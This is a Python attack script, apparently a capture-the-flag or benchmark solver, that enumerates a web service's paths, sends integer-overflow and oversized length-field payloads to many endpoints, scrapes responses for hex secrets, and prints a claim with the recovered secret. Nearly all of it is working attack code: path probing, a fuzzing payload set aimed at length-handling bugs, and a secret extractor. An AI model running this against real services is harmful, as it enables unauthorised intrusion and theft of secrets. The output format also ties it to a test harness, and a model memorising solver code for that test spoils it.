import sys, json, base64, re

def send(obj):
    sys.stdout.write(json.dumps(obj) + "\n")
    sys.stdout.flush()
    line = sys.stdin.readline()
    if not line:
        return None
    line = line.strip()
    if not line:
        return None
    try:
        return json.loads(line)
    except Exception:
        return {"_raw": line}

hits = []

def extract(txt):
    strong = [r'"secret"\s*:\s*"?([0-9a-fA-F]{16,160})', r'SECRET\s*[:=]\s*"?([0-9a-fA-F]{16,160})',
              r'secret[_a-z]*"?\s*[:=]\s*"?([0-9a-fA-F]{16,160})']
    for p in strong:
        m = re.search(p, txt)
        if m:
            return (m.group(1), True)
    low = txt.lower()
    if ('secret' in low or 'token' in low or 'flag' in low):
        m = re.search(r'\b([0-9a-fA-F]{32,128})\b', txt)
        if m:
            return (m.group(1), False)
    return None

def examine(label, r, quiet=False):
    if not r:
        return ''
    b64 = r.get('body_b64') or ''
    try:
        raw = base64.b64decode(b64)
        txt = raw.decode('utf-8', 'replace')
    except Exception:
        txt = ''
    st = r.get('status')
    hit = extract(txt)
    if not quiet:
        print('R %s st=%s ct=%s len=%d body=%s' % (label, st, r.get('content_type'), len(txt), txt[:240].replace('\n', ' ')))
    if hit:
        hits.append((label, hit[0], hit[1]))
        print('HIT %s %s strong=%s' % (label, hit[0], hit[1]))
    return txt

paths = ['/', '/health', '/robots.txt', '/help', '/api', '/parse', '/records', '/record', '/upload',
         '/data', '/ingest', '/index.html', '/docs', '/flag', '/secret', '/api/parse', '/v1/parse']
found_paths = set()
for p in paths:
    txt = examine('GET ' + p, send({'http': {'method': 'GET', 'path': p}}))
    for m in re.finditer(r'(?:POST|GET|PUT)\s+(/[A-Za-z0-9_./-]*)', txt or ''):
        found_paths.add(m.group(1))

endpoints = ['/parse', '/records', '/record', '/upload', '/data', '/ingest', '/', '/api/parse',
             '/records/parse', '/v1/parse', '/parse/record', '/submit', '/api/records', '/add', '/create', '/read']
for p in found_paths:
    if p not in endpoints:
        endpoints.append(p)

payloads = []
def add(name, b):
    payloads.append((name, b))

L1 = [0xFF, 0x7F, 0x10, 0x20, 0x40, 0x80]
L2 = [0xFFFF, 0xFFFE, 0x7FFF, 0x8000, 0x1000, 0xFFF0]
L4 = [0xFFFFFFFF, 0xFFFFFFFE, 0x7FFFFFFF, 0x80000000, 0x00FFFFFF, 0xFFFF0000, 0x00010000, 0x00100000, 0x0000FFFF]
L8 = [0xFFFFFFFFFFFFFFFF, 0x7FFFFFFFFFFFFFFF, 0x0000000100000000]

for L in L4:
    for n in (0, 8):
        add('be4_%x_%d' % (L, n), L.to_bytes(4, 'big') + b'A' * n)
for L in L2:
    for n in (0, 8):
        add('be2_%x_%d' % (L, n), L.to_bytes(2, 'big') + b'A' * n)
for L in L4:
    for n in (0, 8):
        add('le4_%x_%d' % (L, n), L.to_bytes(4, 'little') + b'A' * n)
for L in L2:
    for n in (0, 8):
        add('le2_%x_%d' % (L, n), L.to_bytes(2, 'little') + b'A' * n)
for L in L8:
    add('be8_%x' % L, L.to_bytes(8, 'big'))
for L in L1:
    add('be1_%x' % L, bytes([L]))
for L in [0xFFFF, 0x7FFFFFFF, 0xFFFFFFFF, 1000000, 4294967295]:
    add('ascii_colon_%d' % L, ('%d:' % L).encode())
    add('ascii_len_%d' % L, ('LEN=%d\n' % L).encode())
    add('ascii_sp_%d' % L, ('LEN %d\n' % L).encode())
add('json_len_huge', json.dumps({'len': 4294967295, 'data': 'A'}).encode())
add('json_len_big', json.dumps({'length': 999999999, 'payload': 'A'}).encode())
add('json_size', json.dumps({'size': 2147483647, 'data': 'A'}).encode())
add('huge_raw', b'A' * 70000)
add('huge_raw2', b'\x00' * 66000)

hdrs = {'Content-Type': 'application/octet-stream'}
count = 0
for ep in endpoints:
    for (nm, b) in payloads:
        r = send({'http': {'method': 'POST', 'path': ep, 'body_hex': b.hex(), 'headers': hdrs}})
        examine('POST %s %s' % (ep, nm), r, quiet=True)
        count += 1
        if hits:
            break
    if hits:
        break

if not hits:
    for ep in endpoints[:8]:
        for (nm, b) in payloads[:10]:
            r = send({'http': {'method': 'PUT', 'path': ep, 'body_hex': b.hex()}})
            examine('PUT %s %s' % (ep, nm), r, quiet=True)
            count += 1
            if hits:
                break
        if hits:
            break

strong = [h for h in hits if h[2]]
print('TOTAL_REQUESTS %d HITS %d' % (count, len(hits)))
if strong or hits:
    val = (strong or hits)[0][1]
    print('CLAIM:' + json.dumps({'secret_hex': val.lower()}))